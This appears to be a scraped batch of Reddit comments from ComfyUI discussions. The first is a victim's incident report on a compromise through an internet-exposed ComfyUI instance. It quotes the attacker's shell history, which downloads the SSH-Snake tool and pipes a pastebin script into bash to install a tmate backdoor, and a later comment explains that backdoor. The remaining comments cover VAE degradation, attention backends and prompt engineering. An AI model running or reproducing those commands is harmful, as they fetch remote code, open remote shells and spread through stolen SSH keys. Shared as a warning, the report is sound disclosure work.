I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2** - ROOT CAUSE\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. **Edit:** People want me to point out that this node by itself is normally not problematic. Basically it's like a semi truck, typically it's just a productive, useful thing. What I did was essentially stand in front of the truck and give the keys to a killer. \n\n**More important than the specific node is the dumb shit I did to allow this**: I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... and clearly there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",

Containerization should not touch the GPU at all (beyond using whatever libraries you installed in the container).\n\nIn fact I'd argue it is quite possible that containerization *improves* GPU use as you are dealing with a lot less driver/library bloat than you would if you're using the host machine directly for everything you do.\n\nYou are right in the sense that, in WSL2, there are a few strange issues that stem out of the emulated Linux environment. For example, there is a weird cap on RAM speed that come from the way WSL2 works. But you can essentially the same WSL2 performance with a docker container inside it.",

It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n✅ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",

Take this with a pinch of salt and it’s not a confirmation that it’s definitely a safe node.

If i use multiple models and multiple ksamplers in a workflow, say initially making a gen with klein and then doing a refinement pass with zimage how does this node affect that, can the attention mechanisms be changed on the fly like that or is it one attention per run?  If it can be changed on the fly do I put one of these nodes in front of each ksampler?   \n3.  Is there any added time for the first one while its collecting the data? \n\nThanks!",

The node doesn’t “stack” extra acceleration on top of SageAttention2, it just chooses the fastest attention implementation available (or the fastest Sage variant) for your GPU + model + seq\\_len.\n\nThe catch is: you usually don’t know what’s fastest ahead of time. SageAttention2 itself has multiple variants / kernels (and there are also SageAttention2++ style variants depending on what you installed), and sometimes FlashAttention (2/3) or another backend can win on certain GPUs / shapes.\n\nSo the real answer is: could be 0%, could be noticeable and the whole point of the node is to benchmark your setup once and stop guessing.",

Once the Attention Optimizer node executes, the selected attention backend is used for the rest of that run and subsequent renders in the same session, regardless of which workflow you run next, until you change it again or restart ComfyUI. The only thing persisted to disk is the benchmark cache (`benchmark_db.json`) so future runs can pick the same winner instantly.\n\nYou also do not need to add any separate SageAttention / Flash / xFormers nodes to the workflow. This node detects what’s installed, benchmarks only the available backends, and applies the fastest (or your forced choice). If a backend isn’t installed it’s skipped during benchmarking, and if you force a backend that’s not available it falls back to PyTorch SDPA and reports it.",

          "text": "Wow great work! I'm really surprised by how much use this workflow has gotten. This is literally the 3rd or 4th post I've come across that mentioned using the workflow I created a few weeks ago.  \n  \n I really thought it would be of limited use since it was mostly going to be a static camera (due to the lora). There are probably better optimized workflows out there by now which probably haven't gotten as much attention as mine. The workflow  is just a heavily modified workflow of an early and messy \"use your own mp3/audio\" that I found when LTX-2 first came out.   \n  \nBy the way, the steps value in the first pass is actually set really, really high at 25 steps. I meant to update that post with a version 3 to note that you can actually get away with just 15 steps, maybe less in this node. Lowering this allows for higher resolutions or longer videos at certain resolutions. I've seen a few people get up to 40-50s at near 720p if they have your hardware though it is kinda boring watching one shot for that long. I think 15-25 is good for each shot mixed in with non-lip synced audio.   \n\n\nI've taken a bit of a break from Ai generation but it's great to see what people are up to.\n\nhttps://preview.redd.it/gzb5oq6xr4gg1.png?width=724&format=png&auto=webp&s=8098263ea646f6310b29aaef0fd33aad39fee2a1",

I modified it some more this week to make use of the first to last frame technique, so I'm planning to take it for another spin this coming weekend. Wonder how it will perform with french lip syncing, as Clair obscur has some amazing songs too, though the art for this game is not as abundant as for CP2077, but I'll try to make something out of it ;)\n\nHuge thanks again for your contribution to the community 🫶",

Nothing explicit but my post from another subreddit got removed for being too sexually appealing I guess lol 😂 So for this second part I swayed a bit into puppy friendly territory.

          "text": ">If you pass it through six times you get a slight fading effect, that is all\n\nNo, that is not all. The VAE will degrade the details of the image. Below is a bunch of comparisons between input image and 8x trips through a VAE encode/decode cycle (scroll to zoom in):\n\n[Here is a robot](https://imgsli.com/NDQ0NjY3).\n\n[Here is an anime creature.](https://imgsli.com/NDQ0NjY4)\n\n[Here is a random demon woman](https://imgsli.com/NDQ0Njcy).\n\n[Here is a Fernando Alonso](https://imgsli.com/NDQ0Njcx).\n\n[Here is a lower resolution Fernando Alonso](https://imgsli.com/NDQ0Njgy).\n\nYour methodology isn't great because you are running a single 1080 x 1935 image through the VAE so the loss of detail is much less noticeable. When you run a 1 megapixel image through the same process (like you would with image editing, for example) the degradation is much more apparent. Even if the the colors remain basically the same, the destruction of details is too much to be dismissed as a \"slight fading effect\". \n\n---\n\n>It's some sort of groupthink, when no-one actually tested it.\n\nOkay, let's test it. I'll create an image from two inputs, and run 8 edits on consecutive outputs. \n\n[Here](https://i.postimg.cc/dJvcwHqW/grid-00027.png) I make all edits directly with latents, so it was only one encode/decode cycle. 0 Degradation.\n\n[Here](https://i.postimg.cc/R472s7cq/grid-00028.png) I make all edits with images in an encode/decode cycle, changing the seed each prompt. Nothing super noticeable, if at all. There might be if I had static elements that are supposed to remain untouched by the model. Test that next.\n\n[Here](https://i.postimg.cc/dwYxyhz0/grid-00029.png) I make all edits with images in an encode/decode cycle and keep the seed static. There are tons of errors, and they compound from one gen to the next. The wings and midsection are the most noticeable, but there are errors all over the place. So, I can confidently say leaving the seed static from gen to gen will fuck up your image. Now lets test that VAE cycle.\n\n---\n\n[Here](https://i.postimg.cc/rcC97QPW/vae-00001.png) is a run of edits using the VAE.\n\n[Here](https://i.postimg.cc/tytz82M6/vaeless-00001.png) is a run of edits using only latents.\n\nBoth of these runs are the exact same seed, exact same prompts. The differences are subtle, but the result is clear. [Here is the final output](https://imgsli.com/NDQ0NzAw). \n\nCompare the detail on the house and the tree above it on the mug. Every edit had a clear instruction: \"Leave the coffee mug exactly as it is.\" And it did, but the VAE got in the way and degraded the details.\n\nSo yeah, it was some sort of \"groupthink\", but the group was thinking based on knowledge gained over years of doing this. The color degradation was likely based on an unchanging seed, but passing into and out of latent space will still fuck up your image so it's best to avoid it as much as possible. \n\nEven a VAE as good as the Flux2 Vae will fuck up your image with enough cycles, because the tiny mistakes compound with each other. If I ran that mug through ten more edits the results would be even more stark. That's also why you mask when you inpaint, otherwise your final result ends up like mud.",

My reading of that made it seem like you did indeed say there wasn't a quality/detail loss, which is what I was countering. My bad.

Rounding errors are common, but they do not cause image saturation like in these examples.\n\nSure, I didn’t test this with Flux 2, but it looks like the Flux model tends to add a bit more saturation to the input image on each pass. My suspicion is that Flux has a built-in corrector that works “well” on the first pass but then accumulates over subsequent passes. The problem is that it seems to be applied only to unchanged areas, so ideally your correction pass should also target only those areas.\n\nHave you tried whether the same behavior happens with img2img without inpainting? Did you keep the same seed on each pass, or did you change it? In any case, it’s usually best to do your generation first, then crop and stitch the original background back into the image using the same mask, and only then proceed with the next pass.",

I see a lot of people missing a key piece of information when talking about moving forward with VAEs.\n\nLatent → Image (VAE Decode) is a deterministic operation and does not lose information relative to the latent. Image → Latent (VAE Encode) is a lossy operation.\n\nSo it’s kinda obvious that if you repeatedly chain multiple VAE encode + VAE decode operations, you will eventually lose more and more information. At the same time, you start “saturating” specific patterns that the VAE is good at resolving and encoding. As a result, overall quality degrades, and the image becomes more and more sharp, contrasty, and “AI-looking” in the end.\n\nIt doesn’t matter what tricks you do between those operations - once you keep re-encoding, you are inevitably losing original information.",

For instance, if a large portion of the image is occupied by a person wearing a white T-shirt and you change it to black, the overall color balance of the image shifts. Reflections, lighting, and even the camera’s exposure or white balance adapt to the new mid-gray of the scene.   As example looking at the arm, the upper part should show a different light reflection, but it doesn’t. For me, that means using masking along with a low-percentage blend of the unmasked areas could be sufficient.",

I've probably been through a dozen image managers, some browser-based, some standalone, and one of the common limitations I run into is availability of good generation metadata. With your app, I'm finding prompt decoding to be a bit hit and miss from ComfyUI images, but the core gen info (model, vae, seed, steps, etc) seems reliable. Thanks for continuing to work on this feature.\n\nif you don't have the feature already, maybe consider including an image vision prompt extractor for those cases where an image has unreadable gen data. At least users could get somewhat close to the subject/character of the source image.\n\nIn my experience, standalone apps almost always outperform browser-based apps when it comes to speed of displaying thousands of images, so while integration with gen platforms is a nice-to-have feature, I appreciate the agnostic approach you've taken. This also makes the app more future proof. I use an amazing LoraManager app as well, but I don't like that it's tied to ComfyUI. If ComfyUI breaks or stops working for whatever reason, you can't use the tool, even just to look up gen or model info.\n\nNice job 👍",

              "text": "Hey there! Thanks for the feedback. Regarding the 'animation', its actually a performance feature rather than an intentional effect. To keep navigation fast, the app loads the low-res thumbnail first so you can scroll through thousands of images without waiting for the full files to decode. Once the high-res image is ready, it swaps it in. That 'quick grow' you're seeing is that transition to full resolution. Im looking into other performance solutions so that no longer happens. Meanwhile ill consider adding an option to toggle progressive loading until i find a fix!\n\nAbout the speed, the app is built to be snappy even with massive collections (have users testing it with 120k+ images successfully), so if its feeling slow it might be a bottleneck with I/O or the drive where the images are stored. Are you using an SSD, NVME or HDD?",

      "text": "Been obsessed with prompt optimization lately. Wanted to figure out why some prompts produce stunning results while mine look... mid.\n\nSo I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\n**What I found:**\n\n1. **Negative constraints still matter** — telling the model what NOT to do is effective\n2. **Multi-sensory descriptions help** — texture, temperature, even smell make images more vivid\n3. **Group by content type** — structure your prompt based on scene type (portrait, food, product, etc.)\n\nBonus: Once you nail the above, JSON format isn't necessary.\n\n**So I made a system prompt that does this automatically.**\n\nJust plug it into your LLM prompt optimization node, feed it a simple idea like \"a bowl of ramen\", and it expands it into a structured prompt with all those pro techniques baked in.\n\n￼**How to use in ComfyUI:**\n\nUse any LLM node (e.g., GPT, Claude, local LLM) with this as the system prompt. Your workflow would be:\n\nSimple prompt → LLM Node (with this system prompt) → Image Generation\n\n￼**The System Prompt:**\n\nYou are a professional AI image prompt optimization expert. Your task is to rewrite simple user prompts into high-quality, structured versions for better image generation results. Regardless of what the user inputs, output only the pure rewritten result (e.g., do not include \"Rewritten prompt:\"), and do not use markdown symbols.\n\n\\---\n\n\\## Core Rewriting Rules\n\n\\### Rule 1: Replace Feeling Words with Professional Terms\n\nReplace vague feeling words with professional terminology, proper nouns, brand names, or artist names. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Feeling Words | Professional Terms |\n\n|---------------|-------------------|\n\n| Cinematic, vintage, atmospheric | Wong Kar-wai aesthetics, Saul Leiter style |\n\n| Film look, retro texture | Kodak Vision3 500T, Cinestill 800T |\n\n| Warm tones, soft colors | Sakura Pink, Creamy White |\n\n| Japanese fresh style | Japanese airy feel, Wabi-sabi aesthetics |\n\n| High-end design feel | Swiss International Style, Bauhaus functionalism |\n\nTerm Categories:\n\n\\- People: Wong Kar-wai, Saul Leiter, Christopher Doyle, Annie Leibovitz\n\n\\- Film stocks: Kodak Vision3 500T, Cinestill 800T, Fujifilm Superia\n\n\\- Aesthetics: Wabi-sabi, Bauhaus, Swiss International Style, MUJI visual language\n\n\\### Rule 2: Replace Adjectives with Quantified Parameters\n\nReplace subjective adjectives with specific technical parameters and values. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Adjectives | Quantified Parameters |\n\n|------------|----------------------|\n\n| Professional photography, high-end feel | 90mm lens, f/1.8, high dynamic range |\n\n| Top-down view, from above | 45-degree overhead angle |\n\n| Soft lighting | Soft side backlight, diffused light |\n\n| Blurred background | Shallow depth of field |\n\n| Tilted composition | Dutch angle |\n\n| Dramatic lighting | Volumetric light |\n\n| Ultra-wide | 16mm wide-angle lens |\n\n\\### Rule 3: Add Negative Constraints\n\nAdd explicit prohibitions at the end of prompts to prevent unwanted elements.\n\nCommon Negative Constraints:\n\n\\- No text or words allowed\n\n\\- No low-key dark lighting or strong contrast\n\n\\- No high-saturation neon colors or artificial plastic textures\n\n\\- Product must not be distorted, warped, or redesigned\n\n\\- Do not obscure the face\n\n\\### Rule 4: Sensory Stacking\n\nGo beyond pure visual descriptions by adding multiple sensory dimensions to bring the image to life. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\nSensory Dimensions:\n\n\\- Visual: Color, light and shadow, composition (basics)\n\n\\- Tactile: \"Texture feels tangible\", \"Soft and tempting\", \"Delicate texture\"\n\n\\- Olfactory: \"Aroma seems to penetrate the frame\", \"Exudes warm fragrance\"\n\n\\- Motion: \"Surface gently trembles\", \"Steam wisps slowly descending\"\n\n\\- Temperature: \"Steamy warmth\", \"Moist\"\n\n\\### Rule 5: Group and Cluster\n\nFor complex scenes, cluster similar information into groups using subheadings to separate different dimensions.\n\nGrouping Patterns:\n\n\\- Visual Rules\n\n\\- Lighting & Style\n\n\\- Overall Feel\n\n\\- Constraints\n\n\\### Rule 6: Format Adaptation\n\nChoose appropriate format based on content complexity:\n\n\\- Simple scenes (single subject): Natural language paragraphs\n\n\\- Complex scenes (multiple elements/requirements): Structured groupings\n\n\\---\n\n\\## Scene Adaptation Guide\n\nIdentify scene type based on user intent and choose appropriate rewriting strategy. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Scene Type | Recommended Terms | Recommended Parameters | Common Constraints |\n\n|------------|------------------|----------------------|-------------------|\n\n| Product Photography | Hasselblad, Apple product aesthetics | Studio lighting, high dynamic range | No product distortion, no text watermarks |\n\n| Portrait Photography | Wong Kar-wai, Annie Leibovitz | 90mm, f/1.8, shallow depth of field | Maintain realistic facial features, preserve identity |\n\n| Food Photography | High-end culinary magazine style | 45-degree overhead, soft side light | No utensil distractions, no text |\n\n| Cinematic | Christopher Doyle, Cinestill 800T | 35mm anamorphic lens, Dutch angle | No low-key dark lighting (unless requested) |\n\n| Japanese Style | Japanese airy feel, Wabi-sabi aesthetics | High-key photography, diffused light | No high-saturation neon colors |\n\n| Design Poster | Swiss International Style, Bauhaus | Grid system, minimal color palette | Clear information hierarchy |\n\n\\---\n\n\\## Example\n\n\\*\\*User Input:\\*\\*\n\na portrait with cinematic feel\n\n\\*\\*Rewritten Prompt:\\*\\*\n\nCinematic portrait photography, shot through rain-soaked glass at a dimly lit restaurant at night.\n\nVisual Style:\n\nWong Kar-wai and Saul Leiter aesthetics. Deep saturated colors, heavy shadows. Shot with 90mm lens, f/1.8, Kodak Vision3 500T film grain.\n\nLighting & Atmosphere:\n\nNeon green and red city lights refracting through raindrops in the foreground. Soft focus, dreamy, emotionally evocative. The air is filled with moisture, loneliness, and nostalgia.\n\nConstraints:\n\nMaintain realistic facial features. Do not alter identity characteristics.\n\n￼**The dataset is open source too** — 1,000+ prompts with image links, all in JSON:\n\n👉 [ https://github.com/jau123/nanobanana-trending-prompts ](https://github.com/jau123/nanobanana-trending-prompts)\n\nCheck all datasets with Gallery 👉 [meigen.ai](https://www.meigen.ai)\n\nLet me know if you try it out.

          "text": "If you don't mind a bit of criticism, I think your methodology and the conclusions you have drawn are a bit flawed. I appreciate the drive to learn it and share, but you've hit a couple traps that are super common when learning image gen.\n\nThis bit immediately caught my attention:\n\n>So I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\nSorry, but you didn't collect 1000+ trending prompts. Trending prompts don't exist. What you've done is collect 1000+ trending images and grabbed the prompts from those. They're similar, but they aren't the same thing. \n\nRelying on trending images means you are only sourcing the most attention-grabbing results with no regard for how closely the models followed the prompts. Wanna know what draws the most attention in the AI space online? Your .json of trending prompts contains 479 mentions of the keyword \"woman\", 376 mentions of the word \"girl\", and 212 mentions of the word \"female\". \n\nPeople don't care about the prompt, they care about a pretty picture, and models are experts at delivering a pretty picture. That's basically all they're good for. \n\n[Take this image from Nanobanana Pro](https://i.postimg.cc/dqSZtvNj/nano-4.jpg). Looks cool, right? Imagine I'm some guy on X with a following, and this got a couple hundred likes and retweets, enough for it to hit your scrape. It must have a good prompt for it to be so popular, right?\n\nWell, the prompt for that image is:\n\n>Generate a cinematic film still using the following random tags as inspiration:\n\n>inr, tae, repair, ilovemy, eoin, hurricane, allo, dianne, baddest, elondon, turk, grove, hawk, cabine, bonnet, genuine, big, flashbacks, nare, kavanaugh, ellis, boogie, pies, vandalism, bham, cassidy, schal, rout, mol\n\n>You must not include any text.\n\nIt's clear the prompt is nonsense, but the model made a sick image anyway. That's what they do, they take any input and try their best to turn chicken shit into chicken salad. \n\nThat's a good thing, but that strength also leads a lot of people astray. If you have found any similarities between the prompts, try not to draw the conclusion that \"this is in the prompt, the image is good, therefore the prompt must be good.\" \n\nPeople naturally follow the herd and try looking online to find pretty images to see how it's done, they find one and copy the keywords, but the image they've copied *also* copied those keywords from a different image, which in turn copied from another image, and so on, creating a feedback loop of the blind leading the blind. \n\nAsk any of the prompters in the chain why their image is good, they'll respond with \"It's the prompt.\" Ask them *why* they've included what they have in the prompt and you'll get some variation of \"Because it makes the image better.\" \n\nSeriously, the .json dataset is comprised of tons of overused and unnecessary keywords that have been hanging around long past their use-by date and will barely make a difference in the generation. There are 1232 mentions of the keyword \"realistic\" of which 304 are \"photorealistic\" and 191 are \"ultra-realistic\", 130 \"ultra-detailed\", 8 \"best quality\", 29 \"masterpiece\", 55 \"4k\", 308 \"8k\", hell, there's even 1 \"artstation\" that's made its way through. \n\nWhat your dataset primarily shows is the model is good at making pretty images. What it doesn't show is how to make particular pretty images.\n\nNow, I'm not saying all your recommendations are wrong necessarily. A couple look good, others do not (I didn't think I'd have to write this, but don't prompt for smell, or taste, or sound, or touch. These models are trained on visuals, so use visual descriptors.) \n\nWhat I'm saying is you can't draw conclusions based on the popularity of an image. Again, there's more than 1200 mentions of realistic in your dataset, which must mean it's a good keyword since it's so popular, right? No, if you want a realistic image just include the medium in the prompt. An amateur photo, a cinematic film still, a polaroid, whatever. You only need \"realistic\" to reinforce the medium if the rest of the prompt is pushing towards an unrealistic style.\n\nSorry If I came off like a dick at any point here, it really is super cool you're doing this and sharing it. It's hard to be thorough and diplomatic at the same time when trying to point out flaws in someone's idea. \n\nSo I don't look like a complete dickhead just here to shit on someone else's effort, here's a site that will help you out if you feel like scraping more popular images and their prompts: https://civitlab.devix.pl/ It's the civit gallery, but much more easily searchable.",

Here’s the framework I use to generate the style prompts:\n\n# 🤖 Agent System Prompt: Visual Essence Extractor\n\n**1. Role Definition** You are a premier Visual Arts Analyst and Prompt Engineering Specialist. Your mission is to deeply deconstruct the **\"Visual DNA\"** of an input image and translate it into a high-purity English Style Prompt for use in Stable Diffusion, Midjourney, or ComfyUI style transfer workflows.\n\n**2. Analytical Framework (Internal Scan)** When an image is provided, strictly analyze it across these five dimensions (do not output the analysis process, only the results):\n\n* **Artistic Medium & Technique:** e.g., Oil painting, digital 3D render, Ukiyo-e, cyberpunk photography, charcoal sketch.\n* **Color Palette & Harmony:** e.g., Monochromatic, complementary teal and orange, muted earth tones, neon-saturated.\n* **Lighting & Atmosphere:** e.g., Volumetric fog, cinematic rim lighting, high-key, soft bokeh, moody chiaroscuro.\n* **Texture & Grain:** e.g., Grainy film texture, thick impasto brushstrokes, glossy plastic, hyper-detailed skin pores.\n* **Artistic Influence/Era:** e.g., Studio Ghibli style, 1970s vintage aesthetic, brutalist architecture style.\n\n**3. Output Constraints**\n\n* **Direct Output:** Strictly NO preamble (e.g., \"Based on the image...\"), NO conclusions, and NO explanations.\n* **Language:** Must use pure, idiomatic English keywords.\n* **Format:** Use a comma-separated list (Tag-based style) to ensure balanced weights.\n* **Distillation:** Strip away all **Subject Matter** descriptions (e.g., \"a woman,\" \"a tree\"). Keep ONLY words that describe the **Style**.\n\n**4. Execution Logic**\n\n* **Input:** \\[Image\\]\n* **Task:** Extract the stylistic DNA.\n* **Output:** ONLY the English descriptive keywords for the style. No meta-talk.\n\n**🧪 Example Output:** *If inputting a cyberpunk rain-night photograph:* `Cinematic photography, cyberpunk aesthetic, rain-slicked surfaces, neon reflections, high contrast, moody teal and magenta color palette, anamorphic lens flare, sharp focus, volumetric night fog, grainy 35mm film texture, hyper-realistic, intricate urban detail.`\n\nGive it a shot and let me know if it helps your generations!",

The post from me is [here](https://www.reddit.com/r/comfyui/comments/1qhf9i7/need_a_simple_nsfw_workflow_and_help_with/) (somewhat frustrated).\n\nThe name shouldn't really be comfyui (maybe it's a joke), maybe it should be something like \"model graph composer with a pretentious name to deceive the masses\". I dunno.\n\nEight days later, after a bunch of tutorials, crawling civit and hugging-face having setup multiple t2i, i2i, i2v workflows (didn't create from scratch, all were done on other's workflows as bases), I have my first \"production\". (Flux NSFW checkpoint for getting the model exactly to my liking from a significantly different source photo, this alone took 50+ iterations to get the face, figure I wanted, including iterations with QWEN rapid AIO nsfw - so many hits and misses because I'm a noob).\n\nScene link (deletes in 7 days): [LimeWire File Sharing](https://limewire.com/d/v9yCp#TNaPZ941ig)\n\nIt feels UNREAL to see this scene come to life, with the woman almost identical to what I had imagined for so long (the ethnic composition of her face needs a tad bit more Armenian phenotype and proportions, but it is hard to pull off atm).\n\nNot a great piece of work and doesn't hold a candle to what I see on civit, but I'm patting myself on the back for a baby-step achievement. More to come, as I put this woman to work (and upgrade to an OC 5090 asap 😂)\n\nNext few learning goals: Achieving extreme photo-realism to the extent that current models and loras allow it.",

          "text": "Everyone is correct, it's the VAE encoding/decoding that trashes it, and it's an issue with every image editing model. Even nanobanana pro will bake an image if you pass it back and forth a couple times. Unfortunately everything in the image degrades, not just the colors, so a simple color correct pass won't fix it.\n\nThere is a way to make multiple successive edits without the severe degradation, you just need to work with latents instead of images, but at the moment it's an extremely clunky process. You need to use the \"SaveLatent\" and \"LoadLatent\" nodes. \n\n[Here is a grid showing a multi-image edit](https://i.postimg.cc/c6yNgdy7/grid-00001.png) to swap a character's clothes. It is input/input/output.\n\n[And here is another grid](https://i.postimg.cc/HH5TVFFR/grid-00008.png) showing ~~7~~ 6 consecutive edits with minimal degradation.  \n\nTo use this technique, first run the first edit you want to do and save the latent and image to the same folder. This will make it easier to track which latent is which image, which will be important. It's pretty simple, and [will look like this](https://i.postimg.cc/Q8zgwFXM/Screenshot-2026-01-23-171025.png).\n\nNow the annoying part is you need to copy the latent from your/output/folder to Comfy's input folder. Make sure you copy instead of move, otherwise your image/latent name pairing will be out of sync. You'll need to do this for every successive edit you make, so if you're using windows 11 just middle click both folders to open them in new tabs in windows explorer, it will make it much easier to transfer the files.\n\nNow unpack the \"Reference conditioning\" subgraph and delete the vae encode node, and plug a \"LoadLatent\" node straight into both ReferenceLatent nodes. [It will look like this](https://i.postimg.cc/fTyNLqG3/Screenshot-2026-01-23-171144.png).\n\nImportant: You need to manually set the actual latent width and height, and the width and height of the flux2scheduler to match your input. If you feel like automating the math, Derfuu has a get latent size node, and you can combine that with math nodes to x2 the latent size to get the correct resolution. [It'll look like this](https://i.postimg.cc/nhMB3x6s/Screenshot-2026-01-23-172416.png). Then just plug the outputs into the width/height inputs.\n\nMaybe important: Change the noise seed every edit. In older models, running the same noise on the same image can burn the image extremely badly. I'm unsure if that's an issue with Klein, but better safe than sorry. \n\nNow, make your edit and save the image and latent as before. If you're happy with the image, congratulations, you're done. If you want to make further edits, simply copy-paste the correct latent from your output folder to your input, refresh comfy (just press r), and select the new input latent. Make your edit, save both image and latent, and continue, making as many edits as you want.\n\n---\n\nBefore now you've never really needed to use latents instead of images, so the user experience is awful. There's currently no preview on the latents so you're relying on explorer to see which latent corresponds to which image. The latent also has to be in the input folder, which makes it clunky to immediately switch to the new latent. \n\nI'll have a look and see if I can find a custom node pack that makes working with latents a better experience and whip up an actual workflow. I might try my hand at vibecoding a solution if there isn't one to be found because while this technique produces infinitely better results than the out of the box workflow it's just such a pain in the dick to actually use.",

Your input image is 1536 x 2752, and the Flux2 Klein base resolution is 1 megapixel. 1536 x 2752 is 4,227,072 pixels, so you are trying to generate 2x the base resolution. \n\nFor now, bring back the scale to total pixels node and set it to 2 megapixels max. Also make sure to change the seed between generations, and that should set you up right for small edits like these. If you need to make bigger edits like putting a character in a different pose, you will likely need to drop the resolution down closer to base res. \n\nIf you want to work on the full resolution image, you'd be better off running an inpainting workflow on it, where you crop bits out of the image, make your edits on those cropped bits, and reattach. There must be a Klein inpainting workflow around somewhere, let me know if you can't find one and I'll throw one together for you.",

          "text": "Colorshifts in Diffusion + VAE workflows in ComfyUI mainly originate from three technical sources.\n\n\n1. Model capacity and reconstruction error\n\nEvery diffusion model has limited capacity to perfectly reconstruct image content. During iterative, these reconstruction errors accumulate. This becomes most visible in uniform, low-entropy regions such as pure black, gray, or white areas. The observed color shift is therefore not random noise, but the model’s inability to exactly reproduce flat tonal regions across generations.\n\n2. Inpainting and differential diffusion leakage\n\nInpainting introduces unavoidable leakage, even when differential diffusion is implemented directly within the model. Color and sharpness changes are not confined to the masked region, they also affect unmasked areas.\nEven with a fully black (0) mask, subtle changes can be observed outside the intended edit region. Increasing the number of inpainting steps amplifies this effect, causing gradual drift in color and detail both inside and near the mask boundaries.\n\n3. VAE encoding and decoding shifts\n\nVAE-induced color shifts are a well-known issue and have already been thoroughly documented. Any pixel-to-latent and latent-to-pixel conversion introduces small but cumulative deviations in color and contrast.\n\nUsing tiled VAE encoding/decoding generally produces better local color stability compared to full-frame VAE passes, especially at high resolutions. However, tiled VAEs introduce small rounding and boundary errors at tile borders. More details here : https://www.patreon.com/posts/147809146\n\nThere is only one reliable method to exactly maintain image content:\nDo not pass it through the sampler.\n\nThis makes crop-and-stitch workflows essential. Ideally, these operations should happen entirely in pixel space, using the original image data. Even a single VAE encode/decode pass alters the image, so avoiding unnecessary latent conversions is critical when preservation is required.\n\nIn the TBG ETUR Enhanced Tiled Upscaler and Refiner, these principles are fully automated:\n\t•\tCrop-and-stitch handling\n\t•\tVAE correction\n\t•\tLanpaint\n\t•\tMulti-object editing in a single pass\n\nThis allows you to modify many separate objects while keeping the background fully intact.\n\nHow it works\n\nYou can either:\n\t•\tUse the SAM segmentation nodes, or\n\t•\tManually mask all target elements\n\nPass the masks and the input image through the Upscaler and Tiler node with:\n\t•\tUpscale = None\n\t•\tPreset = Full Image\n\nThis configuration converts the workflow into an advanced inpainting pipeline, rather than a tiled upscaler.\n\nThe “ETUR Tile Overrides” node enables:\n\t•\tAutomatic prompt generation\n\t•\tPer-segment prompt assignment\n\t•\tAdditional conditioning per selected element\n\nThe Refiner then applies all modifications while preserving the background. Optionally, the background itself can be refined in the same pass if desired.\n\nThis workflow has been tested with:\n\t•\tFlux, Qwen,ZIT,SD,SDXL,CHROMA\n\t•\tFlux Inpaint\n\t•\tFlux Kontext\n\nIt has not yet been tested with Flux2 Klein, but it should work similarly. Alternatively, a manual crop-and-stitch approach can be used to achieve comparable results.\n\nCore rule\n\nNever sample content that must remain unchanged.",

You will see a color shift with every gen, but it should be only noticeable when doing more intense back-and-forth comparisons (whereas it's quite obvious here).  \n\nIn your example, after the first change you also already had some shifting / squishing of the image. This can happen sometimes, I've found it's usually a good idea to try 2-4 seeds with the same prompt and then pick the best one. You are also running at a resolution that is getting too high for Klein to handle well (1536 x 2752), and it will generally be much less stable because of that. I have generally found (although I haven't tested overly scientifically) that keeping the longest side below about 2k resolution will improve stability significantly when making changes. The model itself tends to output images that are so sharp / clear that I don't find the resolution limitation to actually be all that limiting.  \n\nNot perfect, but [here was the very first image I got](https://imgsli.com/NDQ0NTU4) when I tried with this prompt (after downloading the original PNG of your first image):  \n\n> Subject's shirt is black. Remove the subject's earrings. Remove the people from the background. Keep the subject’s pose and framing unchanged.  \n\nBecause the res is so high, you still get a little bit of squashing/stretching that's noticeable in the face. Maybe it would be perfect in a different seed if you tried a few. Hair color is slightly darker and the coffee cup also darkens slightly, but skin color stayed basically the same. There's a random out-of-focus person that got added into the background and a few other random changes, too. But not bad for literally the first try with a simple multi-change prompt.",

